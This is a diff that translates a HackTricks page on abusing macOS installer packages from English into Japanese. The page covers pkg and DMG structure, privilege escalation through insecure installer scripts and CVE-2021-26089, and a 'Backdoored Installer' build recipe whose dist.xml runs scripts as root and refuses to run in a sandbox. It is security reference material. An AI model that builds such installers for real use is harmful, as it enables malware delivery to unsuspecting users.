@@ -1,25 +1,24 @@
-# macOS Installers Abuse
+# macOS インストーラーの悪用
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Pkg Basic Information
+## Pkg 基本情報
 
-A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.
+macOS **インストーラーパッケージ**（.pkgファイルとも呼ばれる）は、macOSが**ソフトウェアを配布するために使用するファイル形式**です。これらのファイルは、ソフトウェアが正しくインストールおよび実行するために必要なすべてを含む**箱のようなもの**です。
 
-The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.
+パッケージファイル自体は、ターゲットコンピュータにインストールされる**ファイルとディレクトリの階層を保持するアーカイブ**です。また、インストール前後にタスクを実行するための**スクリプト**を含むこともでき、設定ファイルのセットアップやソフトウェアの古いバージョンのクリーンアップなどを行います。
 
-### Hierarchy
+### 階層
 
 <figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>
 
-- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
-- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
-- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
-- **Payload (CPIO archive gzip compresses)**: Files to install in the `install-location` from PackageInfo
-- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.
+- **Distribution (xml)**: カスタマイズ（タイトル、ウェルカムテキスト…）およびスクリプト/インストールチェック
+- **PackageInfo (xml)**: 情報、インストール要件、インストール場所、実行するスクリプトへのパス
+- **Bill of materials (bom)**: インストール、更新、または削除するファイルのリストとファイル権限
+- **Payload (CPIOアーカイブgzip圧縮)**: PackageInfoから`install-location`にインストールするファイル
+- **Scripts (CPIOアーカイブgzip圧縮)**: インストール前後のスクリプトおよび実行のために一時ディレクトリに抽出されたその他のリソース
 
-### Decompress
-
+### 解凍
 ```bash
 # Tool to directly get the files inside a package
 pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"
@@ -33,68 +32,64 @@ xar -xf "/path/to/package.pkg"
 cat Scripts | gzip -dc | cpio -i
 cpio -i < Scripts
 ```
+インストーラーの内容を手動で解凍せずに視覚化するために、無料ツール[**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)を使用することもできます。
 
-In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
+## DMG基本情報
 
-## DMG Basic Information
-
-DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.
+DMGファイル、またはAppleディスクイメージは、AppleのmacOSでディスクイメージに使用されるファイル形式です。DMGファイルは本質的に**マウント可能なディスクイメージ**（独自のファイルシステムを含む）であり、通常は圧縮され、時には暗号化された生のブロックデータを含んでいます。DMGファイルを開くと、macOSはそれを**物理ディスクのようにマウント**し、その内容にアクセスできるようにします。
 
 > [!CAUTION]
-> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
+> **`.dmg`**インストーラーは**非常に多くの形式**をサポートしているため、過去には脆弱性を含むものが悪用されて**カーネルコード実行**を取得されることがありました。
 
-### Hierarchy
+### 階層
 
 <figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>
 
-The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:
+DMGファイルの階層は、内容に基づいて異なる場合があります。ただし、アプリケーションDMGの場合、通常は次の構造に従います：
 
-- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
-  - Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
-  - Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.
+- トップレベル：これはディスクイメージのルートです。通常、アプリケーションと、場合によってはアプリケーションフォルダへのリンクが含まれています。
+- アプリケーション（.app）：これは実際のアプリケーションです。macOSでは、アプリケーションは通常、アプリケーションを構成する多くの個別のファイルとフォルダを含むパッケージです。
+- アプリケーションリンク：これはmacOSのアプリケーションフォルダへのショートカットです。これにより、アプリケーションを簡単にインストールできるようになります。このショートカットに.appファイルをドラッグすることで、アプリをインストールできます。
 
-## Privesc via pkg abuse
+## pkg悪用による特権昇格
 
-### Execution from public directories
+### 公共ディレクトリからの実行
 
-If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:
+例えば、事前または事後インストールスクリプトが**`/var/tmp/Installerutil`**から実行されている場合、攻撃者はそのスクリプトを制御できるため、実行されるたびに特権を昇格させることができます。別の類似の例：
 
 <figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>
 
 ### AuthorizationExecuteWithPrivileges
 
-This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
-
+これは、いくつかのインストーラーやアップデーターが**rootとして何かを実行するために呼び出す**[公開関数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この関数は、**実行する**ための**ファイルの** **パス**をパラメータとして受け取りますが、攻撃者がこのファイルを**変更**できる場合、彼は**特権を昇格させるために**rootでの実行を**悪用**できるようになります。
 ```bash
 # Breakpoint in the function to check wich file is loaded
 (lldb) b AuthorizationExecuteWithPrivileges
 # You could also check FS events to find this missconfig
 ```
-
 For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
 
-### Execution by mounting
+### マウントによる実行
 
-If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.
+インストーラーが `/tmp/fixedname/bla/bla` に書き込む場合、所有者なしで `/tmp/fixedname` 上に **マウントを作成** することが可能で、インストール中に **任意のファイルを変更** してインストールプロセスを悪用できます。
 
-An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
+これの例が **CVE-2021-26089** で、これにより **定期的なスクリプトを上書き** して root として実行することができました。詳細については、こちらのトークを参照してください: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
 
-## pkg as malware
+## pkgをマルウェアとして
 
-### Empty Payload
+### 空のペイロード
 
-It's possible to just generate a **`.pkg`** file with **pre and post-install scripts** without any real payload apart from the malware inside the scripts.
+実際のペイロードはなく、スクリプト内のマルウェアを除いて、**プレインストールおよびポストインストールスクリプト**を持つ **`.pkg`** ファイルを生成することが可能です。
 
-### JS in Distribution xml
+### 配布xml内のJS
 
-It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:
+パッケージの **distribution xml** ファイルに **`<script>`** タグを追加することが可能で、そのコードは実行され、**`system.run`** を使用して **コマンドを実行** できます：
 
 <figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>
 
-### Backdoored Installer
+### バックドア付きインストーラー
 
-Malicious installer using a script and JS code inside dist.xml
-
+dist.xml内にスクリプトとJSコードを使用した悪意のあるインストーラー
 ```bash
 # Package structure
 mkdir -p pkgroot/root/Applications/MyApp
@@ -117,50 +112,49 @@ pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.maliciou
 cat > ./dist.xml <<EOF
 <?xml version="1.0" encoding="utf-8"?>
 <installer-gui-script minSpecVersion="1">
-    <title>Malicious Installer</title>
-    <options customize="allow" require-scripts="false"/>
-    <script>
-        <![CDATA[
-        function installationCheck() {
-            if (system.isSandboxed()) {
-                my.result.title = "Cannot install in a sandbox.";
-                my.result.message = "Please run this installer outside of a sandbox.";
-                return false;
-            }
-            return true;
-        }
-        function volumeCheck() {
-            return true;
-        }
-        function preflight() {
-            system.run("/path/to/preinstall");
-        }
-        function postflight() {
-            system.run("/path/to/postinstall");
-        }
-        ]]>
-    </script>
-    <choices-outline>
-        <line choice="default">
-            <line choice="myapp"/>
-        </line>
-    </choices-outline>
-    <choice id="myapp" title="MyApp">
-        <pkg-ref id="com.malicious.myapp"/>
-    </choice>
-    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
+<title>Malicious Installer</title>
+<options customize="allow" require-scripts="false"/>
+<script>
+<![CDATA[
+function installationCheck() {
+if (system.isSandboxed()) {
+my.result.title = "Cannot install in a sandbox.";
+my.result.message = "Please run this installer outside of a sandbox.";
+return false;
+}
+return true;
+}
+function volumeCheck() {
+return true;
+}
+function preflight() {
+system.run("/path/to/preinstall");
+}
+function postflight() {
+system.run("/path/to/postinstall");
+}
+]]>
+</script>
+<choices-outline>
+<line choice="default">
+<line choice="myapp"/>
+</line>
+</choices-outline>
+<choice id="myapp" title="MyApp">
+<pkg-ref id="com.malicious.myapp"/>
+</choice>
+<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
 </installer-gui-script>
 EOF
 
 # Buil final
 productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
 ```
+## 参考文献
 
-## References
-
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
-- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
+- [**DEF CON 27 - Pkgsの展開 macOSインストーラーパッケージと一般的なセキュリティの欠陥の内部を見てみる**](https://www.youtube.com/watch?v=iASSG0_zobQ)
+- [**OBTS v4.0: "macOSインストーラーのワイルドな世界" - トニー・ランバート**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
+- [**DEF CON 27 - Pkgsの展開 macOSインストーラーパッケージの内部を見てみる**](https://www.youtube.com/watch?v=kCXhIYtODBg)
 - [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
 
 {{#include ../../../banners/hacktricks-training.md}}
